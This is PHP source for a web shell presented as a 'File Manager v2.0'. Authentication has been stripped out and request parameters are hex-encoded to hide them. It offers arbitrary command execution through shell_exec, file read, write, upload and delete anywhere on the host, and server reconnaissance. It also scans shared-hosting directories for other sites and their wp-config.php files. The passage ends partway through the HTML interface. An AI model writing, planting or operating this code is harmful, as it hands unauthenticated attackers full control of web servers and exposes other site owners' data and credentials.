<?php
ob_start(); // cegah error "headers already sent"
error_reporting(E_ALL);
ini_set('display_errors', 1);

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

/* ============================
   === CHANGED: AUTH REMOVED ===
   - Menghapus seluruh konfigurasi password + blok login + session timeout.
   ============================ */

// Initialize current directory
if (!isset($_SESSION['current_dir'])) {
    $_SESSION['current_dir'] = realpath('./');
}

$dir = $_SESSION['current_dir'];

// Ensure directory exists and is readable
if (!is_dir($dir) || !is_readable($dir)) {
    $dir = realpath('./');
    $_SESSION['current_dir'] = $dir;
}

// Handle logout (tetap dibiarkan; hanya reset session & refresh)
if (isset($_GET[bin2hex('logout')])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Handle AJAX requests
if (isset($_POST[bin2hex('action')])) {
    header('Content-Type: application/json');
    $action = hex2bin($_POST[bin2hex('action')]);
    
    switch ($action) {
        case 'navigate':
            if (isset($_POST[bin2hex('path')])) {
                $newPath = hex2bin($_POST[bin2hex('path')]);
                $realPath = realpath($newPath);
                
                // Allow navigation to any readable directory
                if ($realPath && is_dir($realPath) && is_readable($realPath)) {
                    $_SESSION['current_dir'] = $realPath;
                    echo json_encode(array('success' => true, 'path' => bin2hex($realPath)));
                } else {
                    echo json_encode(array('success' => false, 'error' => 'Directory not accessible'));
                }
            } else {
                echo json_encode(array('success' => false, 'error' => 'No path specified'));
            }
            break;
            
        case 'create_file':
            if (isset($_POST[bin2hex('filename')])) {
                $filename = hex2bin($_POST[bin2hex('filename')]);
                $content = isset($_POST[bin2hex('content')]) ? hex2bin($_POST[bin2hex('content')]) : '';
                file_put_contents($dir . '/' . $filename, $content);
                echo json_encode(array('success' => true));
            }
            break;
            
        case 'create_folder':
            if (isset($_POST[bin2hex('foldername')])) {
                $foldername = hex2bin($_POST[bin2hex('foldername')]);
                mkdir($dir . '/' . $foldername);
                echo json_encode(array('success' => true));
            }
            break;
            
        case 'delete':
            if (isset($_POST[bin2hex('item')])) {
                $item = $dir . '/' . hex2bin($_POST[bin2hex('item')]);
                if (is_file($item)) {
                    unlink($item);
                } elseif (is_dir($item)) {
                    @rmdir($item);
                }
                echo json_encode(array('success' => true));
            }
            break;
            
        case 'run_command':
            if (isset($_POST[bin2hex('command')])) {
                $command = hex2bin($_POST[bin2hex('command')]);
                $output = shell_exec($command . ' 2>&1');
                echo json_encode(array('success' => true, 'output' => $output));
            }
            break;
            
        case 'read_file':
            if (isset($_POST[bin2hex('filename')])) {
                $filename = $dir . '/' . hex2bin($_POST[bin2hex('filename')]);
                if (is_file($filename)) {
                    $content = file_get_contents($filename);
                    echo json_encode(array('success' => true, 'content' => bin2hex($content)));
                } else {
                    echo json_encode(array('success' => false, 'error' => 'File not found'));
                }
            }
            break;
            
        case 'save_file':
            if (isset($_POST[bin2hex('filename')]) && isset($_POST[bin2hex('content')])) {
                $filename = $dir . '/' . hex2bin($_POST[bin2hex('filename')]);
                $content = hex2bin($_POST[bin2hex('content')]);
                file_put_contents($filename, $content);
                echo json_encode(array('success' => true));
            }
            break;
            
        case 'server_info':
            $serverInfo = array(
                'php_version' => PHP_VERSION,
                'php_sapi' => php_sapi_name(),
                'server_software' => isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'Unknown',
                'server_name' => isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'Unknown',
                'server_addr' => isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : 'Unknown',
                'server_port' => isset($_SERVER['SERVER_PORT']) ? $_SERVER['SERVER_PORT'] : 'Unknown',
                'document_root' => isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : 'Unknown',
                'current_user' => get_current_user(),
                'system' => php_uname(),
                'loaded_extensions' => get_loaded_extensions(),
                'memory_limit' => ini_get('memory_limit'),
                'max_execution_time' => ini_get('max_execution_time'),
                'upload_max_filesize' => ini_get('upload_max_filesize'),
                'post_max_size' => ini_get('post_max_size'),
                'disabled_functions' => ini_get('disable_functions'),
                'open_basedir' => ini_get('open_basedir'),
                'safe_mode' => ini_get('safe_mode') ? 'On' : 'Off',
                'magic_quotes_gpc' => function_exists('get_magic_quotes_gpc') ? (get_magic_quotes_gpc() ? 'On' : 'Off') : 'Not Available',
                'register_globals' => ini_get('register_globals') ? 'On' : 'Off'
            );
            
            $encodedInfo = array();
            foreach ($serverInfo as $key => $value) {
                if (is_array($value)) {
                    $encodedInfo[bin2hex($key)] = array_map('bin2hex', $value);
                } else {
                    $encodedInfo[bin2hex($key)] = bin2hex((string)$value);
                }
            }
            
            echo json_encode(array('success' => true, 'data' => $encodedInfo));
            break;
            
        case 'upload_file':
    header('Content-Type: application/json'); // ⬅️ tambahkan ini
    if (isset($_FILES['file'])) {
        $uploadedFile = $_FILES['file'];
        $fileName = $uploadedFile['name'];
        $tmpName = $uploadedFile['tmp_name'];
        $error = $uploadedFile['error'];
        $size = $uploadedFile['size'];

        if ($error === UPLOAD_ERR_OK) {
            $targetPath = $dir . '/' . $fileName;

            if (file_exists($targetPath)) {
                $pathInfo = pathinfo($fileName);
                $baseName = $pathInfo['filename'];
                $extension = isset($pathInfo['extension']) ? '.' . $pathInfo['extension'] : '';
                $counter = 1;

                while (file_exists($targetPath)) {
                    $newFileName = $baseName . '_' . $counter . $extension;
                    $targetPath = $dir . '/' . $newFileName;
                    $counter++;
                }
                $fileName = $newFileName;
            }

            if (move_uploaded_file($tmpName, $targetPath)) {
                echo json_encode(array(
                    'success' => true,
                    'message' => bin2hex("File uploaded successfully: $fileName"),
                    'filename' => bin2hex($fileName),
                    'size' => bin2hex(formatBytes($size))
                ));
            } else {
                echo json_encode(array(
                    'success' => false,
                    'error' => bin2hex('Failed to move uploaded file')
                ));
            }
        } else {
            $errorMessages = array(
                UPLOAD_ERR_INI_SIZE => 'File exceeds upload_max_filesize',
                UPLOAD_ERR_FORM_SIZE => 'File exceeds MAX_FILE_SIZE',
                UPLOAD_ERR_PARTIAL => 'File was only partially uploaded',
                UPLOAD_ERR_NO_FILE => 'No file was uploaded',
                UPLOAD_ERR_NO_TMP_DIR => 'Missing temporary folder',
                UPLOAD_ERR_CANT_WRITE => 'Failed to write file to disk',
                UPLOAD_ERR_EXTENSION => 'File upload stopped by extension'
            );
            $errorMsg = isset($errorMessages[$error]) ? $errorMessages[$error] : 'Unknown upload error';
            echo json_encode(array(
                'success' => false,
                'error' => bin2hex($errorMsg)
            ));
        }
    } else {
        echo json_encode(array(
            'success' => false,
            'error' => bin2hex('No file received')
        ));
    }
    break;

            
        case 'symlink_domain':
            $action = hex2bin($_POST[bin2hex('symlink_action')]);
            
            if ($action === 'scan') {
                $possiblePaths = [
                    '/home/','/var/www/','/usr/local/www/','/public_html/','/www/','/domains/',
                    '/var/www/html/','/opt/lampp/htdocs/','/srv/www/'
                ];
                
                $foundDomains = array();
                
                foreach ($possiblePaths as $path) {
                    if (is_dir($path)) {
                        $domains = @scandir($path);
                        if ($domains) {
                            foreach ($domains as $domain) {
                                if ($domain !== '.' && $domain !== '..' && is_dir($path . $domain)) {
                                    $fullPath = rtrim($path . $domain, '/');
                                    
                                    $exists = false;
                                    foreach ($foundDomains as $existing) {
                                        if ($existing['path'] === $fullPath) {
                                            $exists = true; break;
                                        }
                                    }
                                    
                                    if (!$exists) {
                                        $size = is_readable($fullPath) ? 'Readable' : 'No Access';
                                        $fileCount = 0;
                                        
                                        if (is_readable($fullPath)) {
                                            $files = @scandir($fullPath);
                                            if ($files) $fileCount = count($files) - 2;
                                        }
                                        
                                        $isWebDir = false;
                                        $webFiles = ['index.html', 'index.php', 'index.htm', 'wp-config.php', '.htaccess'];
                                        foreach ($webFiles as $webFile) {
                                            if (file_exists($fullPath . '/' . $webFile)) { $isWebDir = true; break; }
                                        }
                                        
                                        $foundDomains[] = array(
                                            'name' => $domain,
                                            'path' => $fullPath,
                                            'size' => $size,
                                            'type' => is_link($fullPath) ? 'Symlink' : 'Directory',
                                            'files' => $fileCount,
                                            'web_dir' => $isWebDir,
                                            'base_path' => $path
                                        );
                                    }
                                }
                            }
                        }
                    }
                }
                
                usort($foundDomains, function($a, $b) {
                    if ($a['web_dir'] && !$b['web_dir']) return -1;
                    if (!$a['web_dir'] && $b['web_dir']) return 1;
                    if ($a['size'] === 'Readable' && $b['size'] !== 'Readable') return -1;
                    if ($a['size'] !== 'Readable' && $b['size'] === 'Readable') return 1;
                    return strcmp($a['name'], $b['name']);
                });
                
                $encodedDomains = array();
                foreach ($foundDomains as $domain) {
                    $encodedDomains[] = array(
                        bin2hex('name') => bin2hex($domain['name']),
                        bin2hex('path') => bin2hex($domain['path']),
                        bin2hex('size') => bin2hex($domain['size']),
                        bin2hex('type') => bin2hex($domain['type']),
                        bin2hex('files') => bin2hex((string)$domain['files']),
                        bin2hex('web_dir') => bin2hex($domain['web_dir'] ? 'Yes' : 'No'),
                        bin2hex('base_path') => bin2hex($domain['base_path'])
                    );
                }
                
                echo json_encode(array('success' => true, 'domains' => $encodedDomains, 'total' => count($foundDomains)));
                
            } else if ($action === 'auto_search') {
                $searchTerm = isset($_POST[bin2hex('search_term')]) ? hex2bin($_POST[bin2hex('search_term')]) : '';
                $searchType = isset($_POST[bin2hex('search_type')]) ? hex2bin($_POST[bin2hex('search_type')]) : 'domains';
                
                $results = array();
                $currentServerName = isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost');
                
                $webPaths = array('/var/www/html/', '/var/www/', '/home/', '/opt/lampp/htdocs/', '/srv/www/');
                
                foreach ($webPaths as $webPath) {
                    if (is_dir($webPath) && is_readable($webPath)) {
                        $items = @scandir($webPath);
                        if ($items) {
                            foreach ($items as $item) {
                                if ($item === '.' || $item === '..') continue;
                                
                                $fullPath = rtrim($webPath, '/') . '/' . $item;
                                if (is_dir($fullPath)) {
                                    $isDomain = strpos($item, '.') !== false && strlen($item) > 3;
                                    
                                    $hasWeb = false;
                                    $webFiles = ['index.html', 'index.php', 'index.htm'];
                                    foreach ($webFiles as $webFile) {
                                        if (file_exists($fullPath . '/' . $webFile)) { $hasWeb = true; break; }
                                    }
                                    
                                    if ($isDomain || $hasWeb || !$searchTerm || stripos($item, $searchTerm) !== false) {
                                        $protocol = isset($_SERVER['HTTPS']) ? 'https://' : 'http://';
                                        $port = isset($_SERVER['SERVER_PORT']) ? $_SERVER['SERVER_PORT'] : 80;
                                        $portStr = ($port != 80 && $port != 443) ? ':' . $port : '';
                                        
                                        $url = $isDomain ? $protocol . $item . $portStr : $protocol . $currentServerName . $portStr . '/' . $item;
                                        $type = $isDomain ? 'Domain Directory' : 'Web Directory';
                                        $status = $hasWeb ? 'Has Web Files' : 'Directory Only';
                                        
                                        $results[] = array(
                                            'name' => $item,
                                            'path' => $fullPath,
                                            'domain' => $isDomain ? $item : $currentServerName . '/' . $item,
                                            'url' => $url,
                                            'type' => $type,
                                            'status' => $status
                                        );
                                    }
                                }
                            }
                        }
                    }
                }
                
                $encodedResults = array();
                foreach ($results as $result) {
                    $encodedResults[] = array(
                        'name' => bin2hex($result['name']),
                        'path' => bin2hex($result['path']),
                        'domain' => bin2hex($result['domain']),
                        'url' => bin2hex($result['url']),
                        'type' => bin2hex($result['type']),
                        'status' => bin2hex($result['status'])
                    );
                }
                
                echo json_encode(array('success' => true, 'results' => $encodedResults, 'total' => count($results)));
                
            } else if ($action === 'scan_domain_dir') {
                $domainPath = isset($_POST[bin2hex('domain_path')]) ? hex2bin($_POST[bin2hex('domain_path')]) : '';
                
                if (!is_dir($domainPath)) {
                    echo json_encode(array('success' => false, 'error' => 'Directory not found'));
                    break;
                }
                
                $info = array(
                    'path' => $domainPath,
                    'files' => array(),
                    'web_files' => array(),
                    'config_files' => array(),
                    'subdirs' => array(),
                    'total_size' => 0
                );
                
                $items = @scandir($domainPath);
                if ($items) {
                    foreach ($items as $item) {
                        if ($item === '.' || $item === '..') continue;
                        
                        $fullPath = $domainPath . '/' . $item;
                        if (is_dir($fullPath)) {
                            $info['subdirs'][] = $item;
                        } else {
                            $size = @filesize($fullPath);
                            $info['total_size'] += $size ?: 0;
                            
                            $ext = strtolower(pathinfo($item, PATHINFO_EXTENSION));
                            if (in_array($ext, ['php', 'html', 'htm', 'js', 'css'])) {
                                $info['web_files'][] = $item;
                            } elseif (in_array($ext, ['conf', 'config', 'ini']) || $item === '.htaccess') {
                                $info['config_files'][] = $item;
                            }
                            
                            $info['files'][] = array('name' => $item, 'size' => $size, 'type' => $ext ? $ext : 'file');
                        }
                    }
                }
                
                echo json_encode(array('success' => true, 'info' => $info));
            }
            break;
    }
    exit;
}

// Get current directory listing
$files = scandir($dir);

// Helper function untuk format file size
function formatBytes($size, $precision = 2) {
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    for ($i = 0; $size > 1024 && $i < count($units) - 1; $i++) {
        $size /= 1024;
    }
    return round($size, $precision) . ' ' . $units[$i];
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>File Manager</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        
        body {
            font-family: 'Courier New', monospace;
            background: #000000;
            color: #00ff00;
            line-height: 1.6;
            min-height: 100vh;
            background-image: 
                linear-gradient(90deg, rgba(0,255,0,0.03) 1px, transparent 1px),
                linear-gradient(rgba(0,255,0,0.03) 1px, transparent 1px);
            background-size: 20px 20px;
        }
        
        .header {
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
            border-bottom: 2px solid #00ff00;
            color: #00ff00;
            padding: 1rem 2rem;
            box-shadow: 0 2px 20px rgba(0,255,0,0.3);
            position: relative;
        }
        
        .header::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(45deg, transparent 48%, #00ff00 49%, #00ff00 51%, transparent 52%);
            opacity: 0.05;
        }
        
        .header-content {
            display: flex;
            justify-content: space-between;
            align-items: center;
            max-width: 1200px;
            margin: 0 auto;
            position: relative;
            z-index: 1;
        }
        
        .header-buttons {
            display: flex;
            gap: 1rem;
            align-items: center;
        }
        
        .info-btn {
            background: linear-gradient(135deg, #0066cc 0%, #004499 100%);
            color: #fff;
            border: none;
            padding: 0.7rem 1.5rem;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s;
            font-weight: bold;
            font-family: 'Courier New', monospace;
        }
        
        .info-btn:hover {
            background: linear-gradient(135deg, #0088ff 0%, #0066cc 100%);
            transform: translateY(-2px);
            box-shadow: 0 4px 15px rgba(0, 102, 204, 0.3);
        }
        
        .header h1 {
            font-size: 1.8rem;
            display: flex;
            align-items: center;
            gap: 0.5rem;
            text-shadow: 0 0 10px #00ff00;
        }
        
        .logout-btn {
            background: linear-gradient(135deg, #00ff00 0%, #00cc00 100%);
            color: #000;
            border: none;
            padding: 0.7rem 1.5rem;
            border-radius: 5px;
            cursor: pointer;
            text-decoration: none;
            transition: all 0.3s;
            font-weight: bold;
            text-transform: uppercase;
            font-family: 'Courier New', monospace;
        }
        
        .logout-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0,255,0,0.4);
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 2rem;
        }
        
        .breadcrumb {
            background: #0a0a0a;
            border: 1px solid #00ff00;
            padding: 1rem;
            border-radius: 8px;
            margin-bottom: 1rem;
            box-shadow: 0 0 15px rgba(0,255,0,0.2);
            font-weight: bold;
        }
        
        .breadcrumb .path-part {
            color: #66ff66;
            cursor: pointer;
            text-decoration: none;
            transition: all 0.3s;
            margin: 0 5px;
        }
        
        .breadcrumb .path-part:hover {
            color: #00ff00;
            text-shadow: 0 0 5px #00ff00;
        }
        
        .breadcrumb .separator {
            color: #00ff00;
            margin: 0 10px;
        }
        
        .controls {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
            gap: 1.5rem;
            margin-bottom: 2rem;
        }
        
        .control-panel {
            background: #0a0a0a;
            border: 2px solid #00ff00;
            padding: 1.5rem;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0,255,0,0.2);
            position: relative;
            overflow: hidden;
        }
        
        .control-panel::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(45deg, transparent 48%, #00ff00 49%, #00ff00 51%, transparent 52%);
            opacity: 0.05;
        }
        
        .control-panel h3 {
            margin-bottom: 1rem;
            color: #00ff00;
            display: flex;
            align-items: center;
            gap: 0.5rem;
            font-size: 1.2rem;
            text-shadow: 0 0 5px #00ff00;
            position: relative;
            z-index: 1;
        }
        
        .form-group {
            margin-bottom: 1rem;
            position: relative;
            z-index: 1;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: bold;
            color: #00ff00;
            text-transform: uppercase;
        }
        
        input[type="text"], textarea, select, .form-control {
            width: 100%;
            padding: 0.8rem;
            background: #1a1a1a;
            border: 2px solid #00ff00;
            border-radius: 5px;
            font-size: 0.9rem;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            transition: all 0.3s;
        }
        
        .file-input {
            padding: 0.5rem;
            cursor: pointer;
        }
        
        .file-input::-webkit-file-upload-button {
            background: linear-gradient(135deg, #00ff00 0%, #00cc00 100%);
            color: #000;
            border: none;
            padding: 0.5rem 1rem;
            border-radius: 3px;
            cursor: pointer;
            font-weight: bold;
            font-family: 'Courier New', monospace;
            margin-right: 1rem;
        }
        
        .file-input::-webkit-file-upload-button:hover {
            background: linear-gradient(135deg, #66ff66 0%, #00ff00 100%);
        }
        
        input[type="text"]:focus, textarea:focus, select:focus, .form-control:focus {
            outline: none;
            box-shadow: 0 0 15px rgba(0,255,0,0.5);
            background: #0f0f0f;
        }
        
        .upload-info {
            margin: 0.5rem 0;
            padding: 0.5rem;
            background: #001100;
            border-radius: 3px;
            border-left: 3px solid #00ff00;
        }
        
        .upload-stats {
            display: flex;
            justify-content: space-between;
            color: #66ff66;
            font-size: 0.85rem;
        }
        
        .upload-progress {
            margin: 1rem 0;
            padding: 1rem;
            background: #000;
            border: 2px solid #00ff00;
            border-radius: 5px;
        }
        
        select option {
            background: #1a1a1a;
            color: #00ff00;
        }
        
        .btn {
            background: linear-gradient(135deg, #00ff00 0%, #00cc00 100%);
            color: #000;
            border: none;
            padding: 0.8rem 1.5rem;
            border-radius: 5px;
            cursor: pointer;
            font-size: 0.9rem;
            font-weight: bold;
            transition: all 0.3s;
            text-transform: uppercase;
            font-family: 'Courier New', monospace;
            position: relative;
            z-index: 1;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0,255,0,0.4);
        }
        
        .btn-small {
            padding: 0.4rem 0.8rem;
            font-size: 0.8rem;
            margin-left: 0.5rem;
        }
        
        .btn-danger {
            background: linear-gradient(135deg, #ff4444 0%, #cc0000 100%);
            color: #fff;
        }
        
        .btn-danger:hover {
            box-shadow: 0 5px 15px rgba(255,68,68,0.4);
        }
        
        .file-list {
            background: #0a0a0a;
            border: 2px solid #00ff00;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0,255,0,0.2);
            overflow: hidden;
        }
        
        .file-item {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 1rem;
            border-bottom: 1px solid #00ff00;
            transition: all 0.3s;
            position: relative;
        }
        
        .file-item:hover {
            background: rgba(0,255,0,0.1);
            box-shadow: inset 0 0 10px rgba(0,255,0,0.2);
        }
        
        .file-item:last-child {
            border-bottom: none;
        }
        
        .file-info {
            display: flex;
            align-items: center;
            gap: 0.75rem;
            flex: 1;
        }
        
        .file-icon {
            font-size: 1.2rem;
            text-shadow: 0 0 5px #00ff00;
        }
        
        .file-name {
            font-weight: bold;
            color: #66ff66;
        }
        
        .file-actions {
            display: flex;
            gap: 0.5rem;
        }
        
        .nav-button {
            background: none;
            border: none;
            color: #00ff00;
            cursor: pointer;
            text-decoration: none;
            font-weight: bold;
            transition: all 0.3s;
            font-family: 'Courier New', monospace;
        }
        
        .nav-button:hover {
            color: #66ff66;
            text-shadow: 0 0 5px #00ff00;
        }
        
        .output {
            background: #000;
            border: 2px solid #00ff00;
            color: #00ff00;
            padding: 1rem;
            margin: 1rem 0;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
            max-height: 300px;
            overflow-y: auto;
            font-size: 0.9rem;
            box-shadow: 0 0 15px rgba(0,255,0,0.3);
        }
        
        .symlink-controls {
            display: flex;
            gap: 1rem;
            margin-bottom: 1rem;
        }
        
        .symlink-controls .btn {
            flex: 1;
        }
        
        .domain-results {
            background: #000;
            border: 2px solid #00ff00;
            color: #00ff00;
            padding: 1rem;
            margin: 1rem 0;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            max-height: 400px;
            overflow-y: auto;
            font-size: 0.85rem;
        }
        
        .domain-item {
            padding: 0.5rem;
            margin: 0.3rem 0;
            border: 1px solid #003300;
            border-radius: 3px;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .domain-item:hover {
            background: #001100;
            border-color: #00ff00;
        }
        
        .domain-name {
            font-weight: bold;
            color: #66ff66;
        }
        
        .domain-path {
            color: #00cc00;
            font-size: 0.8rem;
        }
        
        .domain-info {
            color: #00ff00;
            font-size: 0.75rem;
        }
        
        .search-progress {
            margin: 1rem 0;
            padding: 1rem;
            background: #000;
            border: 2px solid #00ff00;
            border-radius: 5px;
        }
        
        .progress-bar {
            width: 100%;
            height: 20px;
            background: #1a1a1a;
            border-radius: 10px;
            overflow: hidden;
            margin-bottom: 0.5rem;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #00ff00, #66ff66);
            width: 0%;
            transition: width 0.3s ease;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
        }
        
        .progress-text {
            color: #00ff00;
            text-align: center;
            font-family: 'Courier New', monospace;
            font-weight: bold;
        }
        
        .search-stats {
            display: flex;
            justify-content: space-between;
            margin: 0.5rem 0;
            padding: 0.5rem;
            background: #001100;
            border-radius: 3px;
        }
        
        .stat-item {
            color: #66ff66;
            font-size: 0.8rem;
        }
        
        .domain-category {
            background: #002200;
            margin: 1rem 0;
            border-radius: 5px;
            overflow: hidden;
        }
        
        .category-header {
            background: #003300;
            padding: 0.5rem 1rem;
            color: #66ff66;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .category-header:hover {
            background: #004400;
        }
        
        .category-content {
            padding: 0.5rem;
        }
        
        .web-indicator {
            display: inline-block;
            background: #006600;
            color: #fff;
            padding: 0.2rem 0.5rem;
            border-radius: 3px;
            font-size: 0.7rem;
            margin-left: 0.5rem;
        }
        
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            z-index: 1000;
            padding: 2rem;
            overflow-y: auto;
        }
        
        .modal-content {
            background: #0a0a0a;
            border: 2px solid #00ff00;
            border-radius: 10px;
            max-width: 1000px;
            margin: 0 auto;
            padding: 2rem;
            box-shadow: 0 0 30px rgba(0,255,0,0.5);
            position: relative;
        }
        
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 1.5rem;
            padding-bottom: 1rem;
            border-bottom: 1px solid #00ff00;
        }
        
        .modal-header h3 {
            color: #00ff00;
            font-size: 1.5rem;
            text-shadow: 0 0 10px #00ff00;
        }
        
        .close-btn {
            background: #ff4444;
            color: #fff;
            border: none;
            width: 35px;
            height: 35px;
            border-radius: 50%;
            cursor: pointer;
            font-size: 1.2rem;
            transition: all 0.3s;
        }
        
        .close-btn:hover {
            background: #ff6666;
            transform: scale(1.1);
        }
        
        .code-editor {
            width: 100%;
            min-height: 500px;
            background: #000;
            border: 2px solid #00ff00;
            border-radius: 5px;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
            padding: 1rem;
            resize: vertical;
            outline: none;
        }
        
        .server-info-content {
            background: #000;
            border: 2px solid #00ff00;
            border-radius: 5px;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            font-size: 0.85rem;
            padding: 1rem;
            max-height: 600px;
            overflow-y: auto;
        }
        
        .server-info-item {
            display: flex;
            margin-bottom: 0.5rem;
            border-bottom: 1px solid #003300;
            padding-bottom: 0.3rem;
        }
        
        .server-info-key {
            color: #66ff66;
            font-weight: bold;
            min-width: 200px;
            text-transform: uppercase;
        }
        
        .server-info-value {
            color: #00ff00;
            word-break: break-all;
        }
        
        .server-info-section {
            margin-bottom: 1.5rem;
            border: 1px solid #004400;
            border-radius: 3px;
            padding: 1rem;
        }
        
        /* Domain Management Styles */
        .domain-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 0.5rem;
        }
        
        .domain-actions {
            display: flex;
            gap: 5px;
        }
        
        .domain-url {
            color: #00ff00;
            text-decoration: none;
            font-weight: bold;
        }
        
        .domain-url:hover {
            color: #66ff66;
            text-shadow: 0 0 5px #00ff00;
        }
        
        .domain-url-section {
            margin: 0.3rem 0;
            font-size: 0.9rem;
        }
        
        .domain-type {
            padding: 2px 6px;
            border-radius: 3px;
            font-size: 0.8rem;
            font-weight: bold;
        }
        
        .domain-type.domain-directory { background: #001100; color: #00ff00; border: 1px solid #00ff00; }
        .domain-type.web-directory    { background: #000044; color: #4444ff; border: 1px solid #4444ff; }
        .domain-type.virtual-host     { background: #440000; color: #ff4444; border: 1px solid #ff4444; }
        
        .domain-config { font-size: 0.8rem; color: #888; margin-top: 0.3rem; }
        
        /* Domain Analysis Modal */
        .domain-analysis { color: #00ff00; }
        .analysis-section { margin-bottom: 1.5rem; border: 1px solid #004400; border-radius: 5px; padding: 1rem; }
        .analysis-stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 0.5rem; margin-top: 0.5rem; }
        .stat-item { background: #001100; padding: 0.5rem; border-radius: 3px; border: 1px solid #003300; }
        
        /* ===============================
           === CHANGED: scope ke modal ===
           Dulu: .file-list { display:flex; flex-wrap:wrap; ... }
           Sekarang dibatasi ke .domain-analysis .file-list
           Supaya daftar file utama TETAP vertikal, tidak berjajar.
           =============================== */
        .domain-analysis .file-list {
            display: flex;
            flex-wrap: wrap;
            gap: 0.3rem;
            margin-top: 0.5rem;
        }
        
        .file-tag { padding: 2px 6px; border-radius: 3px; font-size: 0.8rem; border: 1px solid; }
        .file-tag.web { background: #001100; color: #00ff00; border-color: #00ff00; }
        .file-tag.config { background: #110000; color: #ff0000; border-color: #ff0000; }
        
        .analysis-actions { display: flex; gap: 10px; margin-top: 1rem; }
        
        .server-info-section h4 {
            color: #66ff66;
            margin: 0 0 1rem 0;
            text-transform: uppercase;
            border-bottom: 1px solid #00ff00;
            padding-bottom: 0.5rem;
        }
        
        .editor-controls { display: flex; gap: 1rem; margin-top: 1rem; justify-content: flex-end; }
        
        .back-nav, .quick-nav, .manual-nav {
            background: #0a0a0a; border: 1px solid #00ff00; padding: 1rem; border-radius: 8px;
            box-shadow: 0 0 15px rgba(0,255,0,0.2); margin-bottom: 1rem;
        }
        
        .quick-nav { display: flex; flex-wrap: wrap; gap: 10px; }
        .quick-nav .nav-button { flex: 1; min-width: 120px; font-size: 0.9rem; }
        
        @media (max-width: 768px) {
            .container { padding: 1rem; }
            .controls { grid-template-columns: 1fr; }
            .file-item { flex-direction: column; align-items: flex-start; gap: 0.5rem; }
            .file-actions { align-self: flex-end; }
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="header-content">
            <h1>📁 FILE MANAGER v2.0</h1>
            <div class="header-buttons">
                <button onclick="showServerInfo()" class="info-btn">🖥️ SERVER INFO</button>
                <a href="?<?php echo bin2hex('logout'); ?>=1" class="logout-btn">🚪 LOGOUT</a>
            </div>
        </div>
    </div>
    
    <div class="container">
        <div class="breadcrumb">
            <strong>📍 CURRENT DIRECTORY:</strong>
            <?php 
            $pathParts = explode('/', str_replace('\\', '/', $dir));
            $currentPath = '';
            foreach ($pathParts as $index => $part) {
                if ($part === '') continue;
                $currentPath .= ($index === 0 ? '' : '/') . $part;
                if ($index === count($pathParts) - 1) {
                    echo '<span class="separator">></span><strong>' . htmlspecialchars($part) . '</strong>';
                } else {
                    echo '<span class="separator">></span><a href="#" class="path-part" onclick="navigateToDir(\'' . bin2hex($currentPath) . '\')">' . htmlspecialchars($part) . '</a>';
                }
            }
            ?>
        </div>
        
        <?php if (dirname($dir) != $dir): ?>
        <div class="back-nav">
            <button class="nav-button" onclick="navigateToDir('<?php echo bin2hex(dirname($dir)); ?>')">
                ⬆️ BACK TO PARENT DIRECTORY
            </button>
        </div>
        <?php endif; ?>
        
        <!-- Quick Navigation -->
        <div class="quick-nav">
            <button class="nav-button" onclick="navigateToDir('<?php echo bin2hex('/'); ?>')">🏠 ROOT (/)</button>
            <button class="nav-button" onclick="navigateToDir('<?php echo bin2hex('/home'); ?>')">👤 HOME</button>
            <button class="nav-button" onclick="navigateToDir('<?php echo bin2hex('/var/www'); ?>')">🌐 WWW</button>
            <button class="nav-button" onclick="navigateToDir('<?php echo bin2hex('/tmp'); ?>')">📁 TMP</button>
            <button class="nav-button" onclick="navigateToDir('<?php echo bin2hex('/etc'); ?>')">⚙️ ETC</button>
        </div>
        
        <!-- Manual Path Navigation -->
        <div class="manual-nav">
            <div class="form-group">
                <label for="manualPath">🔍 NAVIGATE TO PATH:</label>
                <div style="display: flex; gap: 10px;">
                    <input type="text" id="manualPath" placeholder="/path/to/directory" class="form-control" style="flex: 1;">
                    <button class="btn" onclick="navigateToManualPath()">GO</button>
                </div>
            </div>
        </div>
        
